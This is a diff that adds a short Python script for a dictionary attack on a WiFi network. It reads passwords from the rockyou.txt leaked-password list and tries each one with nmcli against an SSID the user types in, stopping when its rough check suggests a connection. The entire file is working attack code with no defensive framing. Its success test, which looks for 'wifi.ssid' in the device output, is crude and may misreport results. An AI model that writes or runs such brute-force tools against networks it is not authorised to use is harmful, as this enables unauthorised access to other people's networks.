@@ -1,0 +1,30 @@
+import subprocess
+
+def login_to_wifi(ssid, password):
+  # Use the nmcli command to connect to the WiFi network
+  subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password])
+
+def main():
+  # Prompt the user for the WiFi SSID
+  ssid = input("Enter the WiFi SSID: ")
+
+  # Read the passwords from the rockyou.txt file
+  with open('rockyou.txt', 'r') as f:
+    passwords = f.readlines()
+
+  # Log into the WiFi network multiple times, trying each password in turn
+  for i, password in enumerate(passwords):
+    # Strip leading and trailing whitespace from the password
+    password = password.strip()
+
+    # Attempt to log into the WiFi network
+    login_to_wifi(ssid, password)
+
+    # Check if the login was successful
+    output = subprocess.run(['nmcli', 'device', 'show', 'wlan0'], capture_output=True).stdout.decode()
+    if "wifi.ssid" in output:
+      print(f"Logged into the WiFi network using password {i+1}")
+      break
+
+# Test the script
+main()
